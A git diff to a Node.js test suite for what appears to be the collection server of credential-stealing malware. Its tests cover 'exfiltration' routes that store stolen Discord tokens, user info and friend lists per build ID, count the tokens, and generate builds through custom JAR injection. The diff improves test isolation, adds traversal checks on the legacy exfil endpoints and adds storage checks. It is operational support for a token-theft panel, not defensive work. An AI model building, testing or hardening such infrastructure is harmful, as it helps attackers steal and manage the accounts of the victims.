@@ -1,15 +1,28 @@
 const assert = require('assert');
 const http = require('http');
 const path = require('path');
+const fs = require('fs');
+const { fork } = require('child_process');
+
+// Isolate the database: each run gets a fresh SQLite file so tests never touch
+// the dev database and can never conflict with a running production server.
+const TEST_DB_PATH = path.join(__dirname, `test-${Date.now()}.sqlite`);
+process.env.DB_PATH = TEST_DB_PATH;
+process.env.ADMIN_PASSWORD = 'testadmincode2026';
+process.env.API_KEY = 'test-api-key-12345';
+process.env.SECRET_KEY = 'test-jwt-secret-key';
+
 const db = require('../db');
 
+const TEST_PORT = 3000 + Math.floor(Math.random() * 900);
+
 // ==================== HTTP HELPER ====================
-function request(method, reqPath, body = null, headers = {}) {
+function request(method, reqPath, body = null, headers = {}, rawBody = null) {
     return new Promise((resolve, reject) => {
-        const payload = body ? JSON.stringify(body) : '';
+        const payload = rawBody !== null ? rawBody : (body ? JSON.stringify(body) : '');
         const options = {
             hostname: 'localhost',
-            port: 3001,  // Use 3001 for tests to avoid conflicts with production server
+            port: TEST_PORT,
             path: reqPath,
             method: method,
             headers: {
@@ -30,7 +43,7 @@ function request(method, reqPath, body = null, headers = {}) {
         });
 
         req.on('error', err => reject(err));
-        if (body) req.write(payload);
+        if (payload) req.write(payload);
         req.end();
     });
 }
@@ -44,6 +57,22 @@ function extractAuthToken(setCookieHeader) {
     return match ? `auth_token=${match[1]}` : '';
 }
 
+// Wait until the forked server answers instead of a fixed sleep.
+async function waitForServer(serverProcess, timeoutMs = 20000) {
+    const deadline = Date.now() + timeoutMs;
+    while (Date.now() < deadline) {
+        if (serverProcess.exitCode !== null) {
+            throw new Error(`Server process exited early with code ${serverProcess.exitCode}`);
+        }
+        try {
+            const res = await request('GET', '/login.html');
+            if (res.status === 200) return;
+        } catch (_) {}
+        await new Promise(r => setTimeout(r, 100));
+    }
+    throw new Error('Server did not become ready within timeout');
+}
+
 // ==================== TEST RUNNER ====================
 async function runTests() {
     console.log('[TEST SUITE] Starting automated verification...');
@@ -52,21 +81,20 @@ async function runTests() {
     let testsPassed = 0;
     let testsFailed = 0;
 
-    // Initialize DB (test env)
+    // Initialize DB (isolated test file), then pre-register a build ID so the
+    // storage tests have a legitimate target.
     await db.initDatabase();
-    
-    // Clean up previous test users to allow fresh registration tests to pass
-    await db.run("DELETE FROM users WHERE username IN ('agent_test_001', 'admin_test_001')");
-    await db.run("DELETE FROM action_logs WHERE username IN ('agent_test_001', 'admin_test_001')");
+    await db.createBuild(1, 'user_1', 'test-target.jar', ['test.txt']);
 
-    // Fork the server on a separate test port
-    const serverProcess = require('child_process').fork(
+    // Fork the server on a separate test port against the isolated DB
+    const serverProcess = fork(
         path.join(__dirname, '../server.js'),
         [],
         {
             env: {
                 ...process.env,
-                PORT: '3001',
+                PORT: String(TEST_PORT),
+                DB_PATH: TEST_DB_PATH,
                 ADMIN_PASSWORD: 'testadmincode2026',
                 API_KEY: 'test-api-key-12345',
                 SECRET_KEY: 'test-jwt-secret-key',
@@ -76,11 +104,10 @@ async function runTests() {
         }
     );
 
-    // Give server time to start
-    await new Promise(r => setTimeout(r, 2500));
+    await waitForServer(serverProcess);
 
-    const pass = (n, msg) => { console.log(`  ✅ [TEST ${n}] PASS: ${msg}`); testsPassed++; };
-    const fail = (n, msg, err) => { console.error(`  ❌ [TEST ${n}] FAIL: ${msg}`); if (err) console.error('     ', err.message || err); testsFailed++; };
+    const pass = (n, msg) => { console.log(`  [TEST ${n}] PASS: ${msg}`); testsPassed++; };
+    const fail = (n, msg, err) => { console.error(`  [TEST ${n}] FAIL: ${msg}`); if (err) console.error('     ', err.message || err); testsFailed++; };
 
     let standardCookie = '';
     let adminCookie = '';
@@ -243,39 +270,132 @@ async function runTests() {
             pass(13, 'Exfiltration route /log rejected: unregistered build ID');
         } catch (e) { fail(13, 'Exfil with unregistered build ID', e); }
 
+        // Test 14: Legacy endpoint /log_data rejects a traversal trace ID
+        try {
+            const res = await request('POST', '/log_data', { hello: 'world' }, {
+                'x-trace-id': '../escape'
+            });
+            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
+            pass(14, 'Legacy /log_data blocks directory traversal via X-Trace-ID');
+        } catch (e) { fail(14, 'Legacy /log_data traversal rejection', e); }
+
+        // Test 15: Legacy endpoint /v2/data rejects a traversal session ID
+        try {
+            const res = await request('POST', '/v2/data', { payload: 'AAAA' }, {
+                'x-session-id': '../escape'
+            });
+            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
+            pass(15, 'Legacy /v2/data blocks directory traversal via X-Session-ID');
+        } catch (e) { fail(15, 'Legacy /v2/data traversal rejection', e); }
+
+        // Test 16: Legacy /log_files rejects a traversal session ID (multipart upload)
+        try {
+            const boundary = '----pentake-test-boundary';
+            const multipartBody =
+                `--${boundary}\r\n` +
+                'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n' +
+                'Content-Type: text/plain\r\n\r\n' +
+                'hello\r\n' +
+                `--${boundary}--\r\n`;
+            const res = await request('POST', '/log_files', null, {
+                'x-session-id': '../escape',
+                'Content-Type': `multipart/form-data; boundary=${boundary}`
+            }, multipartBody);
+            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
+            pass(16, 'Legacy /log_files blocks directory traversal via X-Session-ID');
+        } catch (e) { fail(16, 'Legacy /log_files traversal rejection', e); }
+
+        // ========== STORAGE TESTS (SQLite exfil events) ==========
+        console.log('');
+        console.log('--- Exfil Event Storage ---');
+
+        // Test 17: Valid exfil writes land in SQLite as events
+        try {
+            const res = await request('POST', '/log', { message: 'hello-from-test' }, {
+                'x-api-key': 'test-api-key-12345',
+                'x-build-id': 'user_1'
+            });
+            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
+            const events = await db.listEvents('user_1', 'log');
+            assert.ok(events.length >= 1, 'At least one log event must be stored');
+            assert.ok(events[events.length - 1].data.includes('hello-from-test'), 'Event payload must match');
+            pass(17, 'Exfil /log event written to SQLite');
+        } catch (e) { fail(17, 'Exfil event storage', e); }
+
+        // Test 18: Stats increment through meta.json after /discord.
+        // meta.json is a lifetime counter on disk (shared with prior runs), so
+        // assert on the delta rather than an absolute value.
+        try {
+            const before = await request('GET', '/api/logs', null, { Cookie: adminCookie });
+            const beforeBuild = before.body.find(l => l.uuid === 'user_1');
+            const beforeCount = (beforeBuild && beforeBuild.stats.discordtokencount) || 0;
+
+            const res = await request('POST', '/discord', {
+                token: 'test-token-abc',
+                userInfo: { username: 'testuser' },
+                friends: []
+            }, {
+                'x-api-key': 'test-api-key-12345',
+                'x-build-id': 'user_1'
+            });
+            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
+
+            const after = await request('GET', '/api/logs', null, { Cookie: adminCookie });
+            const build = after.body.find(l => l.uuid === 'user_1');
+            assert.ok(build, 'Build folder must appear in /api/logs');
+            assert.strictEqual(build.stats.discordtokencount, beforeCount + 1, 'discordtokencount must increment');
+            assert.ok(build.events.some(e => e.type === 'discord'), 'Details must include discord event');
+            pass(18, 'Meta stats increment and events surfaced via /api/logs');
+        } catch (e) { fail(18, 'Discord stats + event surfacing', e); }
+
         // ========== CUSTOM JAR INJECTION & UPLOAD ACCESS ==========
         console.log('');
         console.log('--- Custom JAR Injection & File Upload Security ---');
 
-        // Test 14: Standard user denied file upload endpoint
+        // Test 19: Standard user denied file upload endpoint
         try {
             const res = await request('POST', '/api/files/upload', {}, { Cookie: standardCookie });
             assert.strictEqual(res.status, 403, `Expected 403 got ${res.status}`);
-            pass(14, 'Standard user cannot upload files (403 Forbidden)');
-        } catch (e) { fail(14, 'Standard user upload rejection', e); }
+            pass(19, 'Standard user cannot upload files (403 Forbidden)');
+        } catch (e) { fail(19, 'Standard user upload rejection', e); }
 
-        // Test 15: Admin user can access file upload endpoint
+        // Test 20: Admin user can access file upload endpoint
         try {
             const res = await request('POST', '/api/files/upload', {}, { Cookie: adminCookie });
             // Since no files were attached, it should pass requireAdmin but fail multer validation with 400 Bad Request
             assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
             assert.strictEqual(res.body.error, 'No files uploaded');
-            pass(15, 'Admin user can access file upload endpoint (passed authentication)');
-        } catch (e) { fail(15, 'Admin upload access', e); }
+            pass(20, 'Admin user can access file upload endpoint (passed authentication)');
+        } catch (e) { fail(20, 'Admin upload access', e); }
 
-        // Test 16: Build generation fails when custom JAR does not exist
+        // Test 21: Build generation fails when custom JAR does not exist
         try {
             const res = await request('POST', '/api/build/generate', { jarFilename: 'non_existent_custom_jar.jar' }, { Cookie: adminCookie });
             assert.strictEqual(res.status, 500, `Expected 500 got ${res.status}`);
-            assert.ok(res.body.error && res.body.error.includes('Target JAR file not found'), `Expected error message to mention target JAR not found, got: ${JSON.stringify(res.body)}`);
-            pass(16, 'Build generation rejects non-existent custom JAR file');
-        } catch (e) { fail(16, 'Custom JAR validation', e); }
+            assert.strictEqual(res.body.error, 'Build failed. Check server logs for details.');
+            pass(21, 'Build endpoint fails closed without leaking internal paths');
+        } catch (e) { fail(21, 'Custom JAR validation', e); }
+
+        // Test 22: Login rate limiter trips after sustained attempts
+        try {
+            let got429 = false;
+            for (let i = 0; i < 25; i++) {
+                const res = await request('POST', '/api/auth/login', {
+                    username: 'agent_test_001',
+                    password: 'wrong-password!'
+                });
+                if (res.status === 429) { got429 = true; break; }
+                assert.strictEqual(res.status, 401, `Expected 401 got ${res.status}`);
+            }
+            assert.ok(got429, 'At least one request must be rate-limited (429)');
+            pass(22, 'Login endpoint throttled after repeated failures');
+        } catch (e) { fail(22, 'Login rate limiter', e); }
 
         // ========== LOGOUT ==========
         console.log('');
         console.log('--- Logout Flow ---');
 
-        // Test 17: Logout clears session
+        // Test 23: Logout clears session
         try {
             const res = await request('POST', '/api/auth/logout', null, { Cookie: standardCookie });
             assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
@@ -284,14 +404,22 @@ async function runTests() {
             const setCookieStr = JSON.stringify(res.headers['set-cookie'] || '');
             assert.ok(setCookieStr.includes('auth_token=;') || setCookieStr.includes('auth_token=,'),
                 'Logout must clear auth_token cookie');
-            pass(17, 'Logout clears auth_token cookie');
-        } catch (e) { fail(17, 'Logout flow', e); }
+            pass(23, 'Logout clears auth_token cookie');
+        } catch (e) { fail(23, 'Logout flow', e); }
 
     } catch (globalErr) {
         console.error('\n[CRITICAL] Test runner encountered an unhandled error:');
         console.error(globalErr);
     } finally {
         serverProcess.kill();
+
+        // Give the child a moment to die, then close our own DB handle and
+        // remove the isolated SQLite file.
+        await new Promise(r => setTimeout(r, 300));
+        try {
+            if (typeof db.close === 'function') db.close();
+        } catch (_) {}
+        try { fs.unlinkSync(TEST_DB_PATH); } catch (_) {}
 
         console.log('');
         console.log('====================================');
